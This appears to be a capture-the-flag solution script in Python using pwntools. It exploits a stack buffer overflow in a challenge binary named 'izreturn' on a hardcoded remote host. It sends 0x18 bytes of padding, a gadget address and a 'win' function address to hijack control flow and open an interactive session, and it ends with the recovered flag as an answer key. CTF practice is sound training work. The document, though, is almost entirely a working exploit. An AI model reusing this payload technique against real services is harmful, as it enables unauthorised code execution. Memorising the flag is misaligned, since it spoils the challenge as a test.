from pwn import *
import sys

if len(sys.argv) < 2:
	r = process('./izreturn')
	raw_input('debug')
else:
	host, port = '3.1.97.199', 13371
	r = remote(host, port)

win= 0x40073C
payload = 'a'*0x18 + p64(0x000000000040057e) + p64(win)
r.sendlineafter('> ', payload)

r.interactive()
r.close()

# BKSEC{r3t_t0_syst3m}